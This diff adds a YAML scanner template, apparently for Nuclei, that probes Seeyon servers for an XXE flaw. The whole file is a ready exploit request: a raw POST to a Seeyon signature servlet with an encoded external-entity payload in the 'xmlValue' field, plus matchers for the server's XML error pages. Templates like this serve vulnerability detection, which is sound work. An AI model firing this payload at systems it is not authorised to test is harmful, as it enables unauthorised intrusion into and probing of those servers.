@@ -1,0 +1,26 @@
+id: poc-yaml-seeyon-jinge-xxe
+info:
+  name: Seeyon Jinge XXE Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: xxe
+
+http:
+  - raw:
+      - |
+        POST /seeyon/m-signature/RunSignature/run/getAjaxDataServlet?M=deleteUpdateObj&S=ajaxEdocSummaryManager HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        xmlValue=WZwhRE9DVFlQRSBBTllbPCFFTlRJVFkgcm9vdCBTWVNURU0gImh0dHA6Ly8xMjcuMC4wLjEvc2VleW9uIj5dPjxTaWduYXR1cmU%2bPEzpzWxkPjx2YWx1zSBJbmRleD0iUHJvdGVjdGx0zW0iPnRydWU8L3zhbHVlPjx2YWx1zSBJbmRleD0iVkFMVUUiPizyb290OZwvdmFsdWU%2bPC9GaWVszD48L1Npz25hdHVyzT5d&encode=true&imgvalue=MTIzNDU2Nzg5MDEyMzQ1Njc4OTAxMjM0NTY3ODkwMTIzNDU2Nzg5MDEyMzQ1Njc4OTAxMjM0NTY3ODkwMTIzNDVNVEl=&elemId=YWFh
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "<title>异常处理页面</title>"
+          - "系统级错误，请检查localhost.log查看详细异常堆栈："
+          - "解析XML保护数据失败，请检查是否格式正确"
